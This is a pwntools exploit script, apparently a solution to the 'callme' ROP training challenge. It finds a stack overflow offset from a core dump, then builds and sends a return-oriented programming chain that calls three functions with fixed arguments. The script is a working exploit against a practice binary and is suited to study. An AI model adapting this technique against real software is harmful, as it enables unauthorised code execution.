#!/usr/bin/env python3
from pwn import *

# set up context
elf = context.binary = ELF('callme')
context.log_level = 'debug'

# find offset
io = process(elf.path)
io.sendline(cyclic(128))
io.wait()
core = io.corefile
stack = core.rsp
offset = core.read(stack, 4)

# craft payload
'''
Stack layout:

--- HIGH ---
funcptr -> callme_three@plt
arg     -- 0xd00df00dd00df00d
arg     -- 0xcafebabecafebabe
gadget  -> pop rsi ; pop rdx ; ret
arg     -- 0xdeadbeefdeadbeef
gadget  -> pop rdi ; ret

funcptr -> callme_two@plt
arg     -- 0xd00df00dd00df00d
arg     -- 0xcafebabecafebabe
gadget  -> pop rsi ; pop rdx ; ret
arg     -- 0xdeadbeefdeadbeef
gadget  -> pop rdi ; ret

funcptr -> callme_one@plt
arg     -- 0xd00df00dd00df00d
arg     -- 0xcafebabecafebabe
gadget  -> pop rsi ; pop rdx ; ret
arg     -- 0xdeadbeefdeadbeef
gadget  -> pop rdi ; ret
--- LOW  ---

'''
def sym(name: str):
    return elf.symbols[name]

pop_rdi = 0x00000000004009a3  # pop rdi ; ret
pop_rsi_rdx = 0x000000000040093d  # pop rsi ; pop rdx ; ret
arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d

payload = fit(
    { offset : pop_rdi },
    arg1,
    pop_rsi_rdx,
    arg2,
    arg3,
    sym('callme_one'),

    pop_rdi,
    arg1,
    pop_rsi_rdx,
    arg2,
    arg3,
    sym('callme_two'),

    pop_rdi,
    arg1,
    pop_rsi_rdx,
    arg2,
    arg3,
    sym('callme_three'),
)
open('payload.bin', 'wb').write(payload)

io = process(elf.path)
io.recvuntil('> ')
io.sendline(payload)
print(io.recvall().decode('utf-8'))
